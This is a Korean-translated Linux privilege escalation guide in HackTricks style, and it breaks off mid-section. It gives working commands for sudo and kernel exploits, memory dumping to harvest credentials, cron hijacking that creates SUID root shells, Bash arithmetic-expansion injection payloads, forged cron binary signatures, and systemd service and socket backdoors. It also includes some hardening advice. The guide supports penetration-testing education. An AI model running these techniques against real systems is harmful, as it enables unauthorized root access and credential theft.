# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

실행 중인 OS에 대한 정보를 수집해봅시다.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

만약 **have write permissions on any folder inside the `PATH`** 변수에 있다면 일부 libraries나 binaries를 hijack할 수 있습니다:
```bash
echo $PATH
```
### Env info

환경 변수에 흥미로운 정보, 비밀번호 또는 API 키가 있나요?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version을 확인하고, escalate privileges에 사용할 수 있는 exploit가 있는지 확인하세요.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
좋은 취약한 커널 목록과 몇몇 이미 존재하는 **compiled exploits**는 다음에서 찾을 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
다음 사이트들에서도 몇몇 **compiled exploits**를 찾을 수 있습니다: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

해당 웹에서 모든 취약한 커널 버전을 추출하려면 다음을 실행하세요:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits 검색에 도움이 될 수 있는 도구들은 다음과 같습니다:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim에서 실행, only checks exploits for kernel 2.x)

항상 **Google에서 커널 버전을 검색하세요**, 해당 커널 버전이 어떤 kernel exploit에 명시되어 있다면 그 exploit가 유효한지 확신할 수 있습니다.

추가적인 kernel exploitation 기법:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 버전

다음에 나타나는 취약한 sudo 버전을 기반으로:
```bash
searchsploit sudo
```
다음 grep을 사용하여 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 이전의 Sudo 버전 (**1.9.14 - 1.9.17 < 1.9.17p1**) 은 사용자 제어 디렉터리에서 `/etc/nsswitch.conf` 파일을 사용할 경우, 권한이 없는 로컬 사용자가 sudo `--chroot` 옵션을 통해 root로 권한 상승할 수 있도록 허용합니다.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

작성자: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 서명 검증 실패

**smasher2 box of HTB**에서 이 vuln이 어떻게 악용될 수 있는지에 대한 **예시**를 확인하세요.
```bash
dmesg 2>/dev/null | grep "signature"
```
### 추가적인 시스템 열거
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어 수단 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

컨테이너 안에 있다면, 다음 container-security 섹션에서 시작한 다음 runtime-specific abuse 페이지로 피벗하세요:

{{#ref}}
container-security/
{{#endref}}

## Drives

무엇이 **마운트되어 있고 마운트 해제되어 있는지**, 어디에 있으며 왜 그런지 확인하세요. 어떤 항목이 마운트 해제되어 있다면 그것을 마운트해보고 개인 정보를 확인해보세요
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 바이너리 열거
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한, **any compiler is installed**인지 확인하세요. kernel exploit을 사용해야 하는 경우 유용하며, 해당 익스플로잇은 사용하려는 머신(또는 유사한 머신)에서 컴파일하는 것이 권장됩니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 설치된 취약 소프트웨어

설치된 패키지와 서비스의 **버전**을 확인하세요. 예를 들어 오래된 Nagios 버전이 있을 수 있으며, that could be exploited for escalating privileges…\
의심되는 설치된 소프트웨어의 버전을 수동으로 확인하는 것이 권장됩니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _이 명령들은 대부분 쓸모없는 많은 정보를 보여줄 수 있으므로, 설치된 소프트웨어 버전이 알려진 익스플로잇에 취약한지 검사하는 OpenVAS 같은 애플리케이션을 사용하는 것이 권장됩니다._

## Processes

실행 중인 **프로세스가 무엇인지** 확인하고, 어떤 프로세스가 **가지고 있어야 할 권한보다 더 많은 권한을 가지고 있는지** 점검하세요 (예: tomcat이 root로 실행되는 경우).
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
또한 **프로세스 바이너리에 대한 권한을 확인하세요**, 다른 사용자의 파일을 덮어쓸 수 있을지도 모릅니다.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 스크립트
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

주어진 프로세스 ID에 대해, **maps는 해당 프로세스의 가상 주소 공간 내에서 메모리가 어떻게 매핑되는지** 보여주며; 또한 **각 매핑된 영역의 권한**을 표시합니다. **mem** 의 의사 파일은 **프로세스의 메모리 자체를 노출합니다**. **maps** 파일에서 어떤 **메모리 영역이 읽을 수 있는지**와 그 오프셋을 알 수 있습니다. 이 정보를 사용해 **mem 파일을 seek하여 모든 읽을 수 있는 영역을 dump**하여 파일로 저장합니다.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`은 시스템의 **물리적** 메모리에 대한 접근을 제공하며, 가상 메모리는 아닙니다. 커널의 가상 주소 공간에는 /dev/kmem을 사용하여 접근할 수 있습니다.\
일반적으로 `/dev/mem`은 **root** 및 **kmem** 그룹만 읽을 수 있습니다.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump은 Windows용 Sysinternals 툴 모음의 클래식 ProcDump 도구를 Linux용으로 재구성한 버전입니다. 다음에서 확인하세요: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 도구

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_수동으로 root 요구사항을 제거하고 자신이 소유한 프로세스를 덤프할 수 있습니다
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root가 필요함)

### 프로세스 메모리에서의 자격 증명

#### 수동 예제

authenticator 프로세스가 실행 중이라면:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
프로세스를 dump할 수 있으며 (see before sections to find different ways to dump the memory of a process) memory 내에서 credentials를 검색할 수 있습니다:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

이 도구 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)은 **메모리에서 평문 자격 증명을 탈취**하고 일부 **잘 알려진 파일**에서도 이를 수집합니다. 정상적으로 작동하려면 root 권한이 필요합니다.

| 기능                                              | 프로세스 이름         |
| ------------------------------------------------- | -------------------- |
| GDM 비밀번호 (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (활성 FTP 연결)                            | vsftpd               |
| Apache2 (활성 HTTP Basic Auth 세션)               | apache2              |
| OpenSSH (활성 SSH 세션 - sudo 사용)               | sshd:                |

#### 검색 정규식/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 예약된/Cron 작업

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

웹 "Crontab UI" 패널 (alseambusher/crontab-ui)가 root로 실행 중이고 loopback에만 바인딩되어 있더라도, SSH local port-forwarding을 통해 접근해 privileged job을 생성하여 privesc할 수 있습니다.

Typical chain
- loopback 전용 포트(예: 127.0.0.1:8000)와 Basic-Auth realm을 `ss -ntlp` / `curl -v localhost:8000`로 확인
- 운영 아티팩트에서 자격 증명 찾기:
- `zip -P <password>`로 압축된 백업/스크립트
- systemd unit에 `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`가 노출된 경우
- 터널링 후 로그인:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 높은 권한의 job을 생성하고 즉시 실행 (SUID shell을 생성함):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 사용하세요:
```bash
/tmp/rootshell -p   # root shell
```
보안 강화
- Crontab UI를 root로 실행하지 마십시오; 전용 사용자와 최소 권한으로 제한하십시오
- localhost에 바인드하고 추가로 firewall/VPN으로 접근을 제한하십시오; 비밀번호를 재사용하지 마십시오
- unit files에 secrets를 포함하지 마십시오; secret stores 또는 root 전용 EnvironmentFile을 사용하십시오
- 온디맨드 작업 실행에 대해 audit/logging을 활성화하십시오

예약된 작업이 취약한지 확인하십시오. root에 의해 실행되는 스크립트를 악용할 수 있을지 확인해보세요 (wildcard vuln? root가 사용하는 파일을 수정할 수 있는가? symlinks 사용? root가 사용하는 디렉터리에 특정 파일을 생성?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

예를 들어, _/etc/crontab_ 안에서 다음과 같은 PATH를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_user라는 사용자가 /home/user에 쓰기 권한을 가지고 있다는 점에 주목하세요_)

이 crontab 안에서 root 사용자가 경로를 설정하지 않고 어떤 명령이나 스크립트를 실행하려 한다면. 예를 들어: _\* \* \* \* root overwrite.sh_\
그렇다면, 다음을 사용해 root 쉘을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

root에 의해 실행되는 script가 명령어에 “**\***”를 포함하고 있다면, 이를 악용해 원치 않는 동작(예: privesc)을 일으킬 수 있습니다. 예시:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**와일드카드가 경로 앞에 오는 경우(예:** _**/some/path/\***_ **), 취약하지 않습니다 (심지어** _**./\***_ **도 아닙니다).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash는 ((...)), $((...)) 및 let에서 산술 평가 전에 parameter/variable expansion과 command substitution을 수행합니다. 만약 root cron/parser가 신뢰할 수 없는 로그 필드를 읽어 이를 arithmetic context에 넣는다면, 공격자는 command substitution $(...)을 주입하여 cron이 실행될 때 root 권한으로 실행되게 할 수 있습니다.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 로그에 공격자가 제어하는 텍스트를 기록되게 하여 숫자처럼 보이는 필드에 command substitution이 포함되고 끝이 숫자가 되게 하세요. 명령이 stdout에 출력되지 않도록 하거나 리다이렉트하여 산술 표현이 유효하도록 하세요.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

만약 root로 실행되는 **cron script**를 **수정할 수 있다면**, 매우 쉽게 shell을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root에 의해 실행되는 script가 **directory where you have full access**를 사용한다면, 해당 폴더를 삭제하고 **create a symlink folder to another one**하여 당신이 제어하는 script를 제공하도록 만드는 것이 유용할 수 있다.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink 검증 및 더 안전한 파일 처리

경로로 파일을 읽거나 쓰는 권한 있는 스크립트/바이너리를 검토할 때, 링크가 어떻게 처리되는지 확인하세요:

- `stat()`는 symlink를 따라가며 대상의 메타데이터를 반환합니다.
- `lstat()`는 링크 자체의 메타데이터를 반환합니다.
- `readlink -f`와 `namei -l`은 최종 대상을 확인하고 각 경로 구성 요소의 권한을 보여주는 데 도움이 됩니다.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: 경로가 이미 존재하면 실패(공격자가 미리 만든 links/files를 차단).
- `openat()`: 신뢰할 수 있는 디렉터리 파일 디스크립터를 기준으로 동작.
- `mkstemp()`: 보안 권한으로 원자적으로 임시 파일 생성.

### Custom-signed cron binaries with writable payloads
Blue teams는 때때로 cron-driven binaries를 "sign" 하여 커스텀 ELF 섹션을 덤프하고 vendor string을 grep으로 확인한 뒤 root로 실행합니다. 만약 해당 바이너리가 group-writable(e.g., `/opt/AV/periodic-checks/monitor` 소유 `root:devs 770`)이고 signing material을 leak할 수 있다면, 섹션을 위조하여 cron 작업을 하이재킹할 수 있습니다:

1. `pspy`를 사용해 검증 흐름을 캡처합니다. 예로 Era에서는 root가 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`를 실행하고 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`를 실행한 뒤 파일을 실행했습니다.
2. leaked key/config (from `signing.zip`)을 사용해 기대되는 인증서를 재생성합니다:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 악성 대체본을 빌드(e.g., SUID bash 설치, SSH 키 추가)하고 인증서를 `.text_sig`에 삽입하여 grep이 통과하도록 만듭니다:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 실행 권한 비트를 유지하면서 예약된 바이너리를 덮어씁니다:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 다음 cron 실행을 기다리면, 단순한 서명 검사에 통과하는 순간 페이로드가 root로 실행됩니다.

### Frequent cron jobs

프로세스를 모니터링하여 1, 2 또는 5분마다 실행되는 프로세스를 찾을 수 있습니다. 이를 이용해 권한을 상승시킬 여지가 있을 수 있습니다.

예를 들어, **1분 동안 0.1초마다 모니터링**, **실행 빈도가 적은 명령으로 정렬**하고 가장 많이 실행된 명령을 삭제하려면 다음을 수행할 수 있습니다:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (이 도구는 시작되는 모든 프로세스를 모니터링하고 나열합니다).

### 공격자가 설정한 모드 비트를 보존하는 Root 백업 (pg_basebackup)

If a root-owned cron wraps `pg_basebackup` (or any recursive copy) against a database directory you can write to, you can plant a **SUID/SGID binary** that will be recopied as **root:root** with the same mode bits into the backup output.

Typical discovery flow (as a low-priv DB user):
- Use `pspy` to spot a root cron calling something like `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` every minute.
- Confirm the source cluster (e.g., `/var/lib/postgresql/14/main`) is writable by you and the destination (`/opt/backups/current`) becomes owned by root after the job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
이것은 `pg_basebackup`가 클러스터를 복사할 때 파일 모드 비트를 보존하기 때문에 작동합니다; root로 호출되면 대상 파일은 **root 소유권 + 공격자가 선택한 SUID/SGID**를 상속합니다. 권한을 유지하고 실행 가능한 위치에 쓰는 유사한 특권을 가진 백업/복사 루틴은 취약합니다.

### 보이지 않는 cron jobs

주석 뒤에 **캐리지 리턴을 넣는** 방식(줄바꿈 문자 없이)으로 cronjob을 생성할 수 있으며, cronjob은 작동합니다. 예시 (캐리지 리턴 문자에 주목):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

쓰기 권한이 있는 `.service` 파일이 있는지 확인하세요. 가능하다면 해당 파일을 **수정할 수 있으며**, 서비스가 **시작될 때**, **재시작될 때** 또는 **중지될 때** 귀하의 **backdoor**가 **실행되도록** 만들 수 있습니다(머신을 재부팅해야 할 수도 있습니다).\
예를 들어 `.service` 파일 안에 **`ExecStart=/tmp/script.sh`**로 backdoor를 생성하세요.

### Writable service binaries

유의하세요: 만약 당신이 **write permissions over binaries being executed by services**를 가지고 있다면, 이를 backdoors로 변경해서 서비스가 다시 실행될 때 backdoors가 실행되도록 할 수 있습니다.

### systemd PATH - Relative Paths

다음 명령으로 **systemd**가 사용하는 PATH를 확인할 수 있습니다:
```bash
systemctl show-environment
```
경로의 어떤 폴더에든 **쓰기**가 가능하다면 **escalate privileges**를 할 수 있을지도 모릅니다. 다음과 같은 서비스 구성 파일에서 **서비스 구성에 사용되는 상대 경로**를 찾아야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
그런 다음, systemd PATH 폴더(사용자가 쓸 수 있는) 안에 상대 경로 바이너리와 동일한 이름의 **실행 파일**을 생성하고, 서비스가 취약한 동작(**Start**, **Stop**, **Reload**)을 수행하도록 요청되면 당신의 **backdoor**가 실행됩니다(비특권 사용자는 보통 서비스를 시작/중지할 수 없지만 `sudo -l`을 사용해 확인하세요).

**서비스에 대해 자세히 알아보려면 `man systemd.service`를 참고하세요.**

## **타이머**

**Timers**는 이름이 `**.timer**`로 끝나는 systemd unit 파일로, `**.service**` 파일이나 이벤트를 제어합니다. **Timers**는 캘린더 시간 이벤트와 monotonic 시간 이벤트를 기본적으로 지원하고 비동기적으로 실행할 수 있기 때문에 cron의 대안으로 사용할 수 있습니다.

다음 명령으로 모든 타이머를 나열할 수 있습니다:
```bash
systemctl list-timers --all
```
### 쓰기 가능한 타이머

타이머를 수정할 수 있다면 systemd.unit에 존재하는 일부 유닛(예: `.service` 또는 `.target`)을 실행하도록 만들 수 있습니다.
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> 이 타이머가 만료될 때 활성화할 Unit입니다. 인수는 접미사가 not ".timer"인 unit 이름입니다. 지정하지 않으면, 이 값은 접미사를 제외하고 타이머 유닛과 동일한 이름을 가진 service로 기본 설정됩니다. (See above.) 활성화되는 unit 이름과 타이머 unit의 이름은 접미사를 제외하고 동일하게 명명하는 것이 권장됩니다.

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **쓰기 가능한 바이너리를 실행하는**
- Find some systemd unit that is **상대 경로를 실행하는** and you have **systemd PATH에 대한 쓰기 권한이 있는** (to impersonate that executable)

**Learn more about timers with `man systemd.timer`.**

### **타이머 활성화**

타이머를 활성화하려면 root 권한이 필요하며 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## 소켓

Unix Domain Sockets (UDS)는 클라이언트-서버 모델 내에서 동일한 또는 다른 머신 간의 **프로세스 통신**을 가능하게 합니다. 이들은 표준 Unix 디스크립터 파일을 사용하여 컴퓨터 간 통신을 수행하며 `.socket` 파일을 통해 설정됩니다.

소켓은 `.socket` 파일을 사용하여 구성할 수 있습니다.

**소켓에 대해 더 알아보려면 `man systemd.socket`을 확인하세요.** 이 파일 내에서는 여러 흥미로운 매개변수를 구성할 수 있습니다:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 이러한 옵션들은 서로 다르지만 요약하면 소켓이 **어디에서 수신(listen)할지**를 지정하는 데 사용됩니다(예: AF_UNIX 소켓 파일 경로, 수신할 IPv4/6 및/또는 포트 번호 등).
- `Accept`: 불리언 인자를 받습니다. 만약 **true**이면 **들어오는 각 연결마다 서비스 인스턴스가 생성**되며 연결 소켓만 해당 인스턴스에 전달됩니다. 만약 **false**이면 모든 리스닝 소켓 자체가 **시작된 서비스 유닛으로 전달**되며 모든 연결에 대해 단 하나의 서비스 유닛만 생성됩니다. 이 값은 단일 서비스 유닛이 모든 들어오는 트래픽을 무조건 처리하는 datagram 소켓 및 FIFO에서는 무시됩니다. **기본값은 false입니다.** 성능상의 이유로, 새로운 데몬은 `Accept=no`에 적합한 방식으로만 작성하는 것이 권장됩니다.
- `ExecStartPre`, `ExecStartPost`: 하나 이상의 명령줄을 받으며, 리스닝 **소켓**/FIFO가 각각 **생성되어 바인드되기 전** 또는 **후에 실행**됩니다. 명령줄의 첫 토큰은 절대 파일명이어야 하며 그 뒤에 프로세스 인자가 옵니다.
- `ExecStopPre`, `ExecStopPost`: 리스닝 **소켓**/FIFO가 각각 **닫히고 제거되기 전** 또는 **후에 실행되는** 추가 **명령들**입니다.
- `Service`: **들어오는 트래픽**에 대해 활성화할 **서비스** 유닛 이름을 지정합니다. 이 설정은 `Accept=no`인 소켓에만 허용됩니다. 기본적으로 소켓과 동일한 이름을 가진 서비스(접미사가 교체된)를 사용합니다. 대부분의 경우 이 옵션을 사용할 필요는 없습니다.

### 쓰기 가능한 .socket 파일

쓰기 가능한 `.socket` 파일을 찾으면 `[Socket]` 섹션의 시작에 `ExecStartPre=/home/kali/sys/backdoor` 같은 항목을 **추가**할 수 있으며, 그러면 백도어는 소켓이 생성되기 전에 실행됩니다. 따라서 **아마도 머신을 재부팅할 때까지 기다려야 할 것**입니다.\
_시스템이 해당 socket 파일 구성을 사용하고 있어야 하며, 그렇지 않으면 백도어는 실행되지 않습니다_

### 소켓 활성화 + 쓰기 가능한 유닛 경로 (누락된 서비스 생성)

또 다른 심각한 잘못된 구성은 다음과 같습니다:

- a socket unit with `Accept=no` and `Service=<name>.service`
- 참조된 서비스 유닛이 존재하지 않음
- 공격자가 `/etc/systemd/system` (또는 다른 유닛 검색 경로)에 쓸 수 있음

이 경우 공격자는 `<name>.service`를 생성한 다음 소켓으로 트래픽을 유발시켜 systemd가 새 서비스를 로드하고 root로 실행하게 할 수 있습니다.

Quick flow:
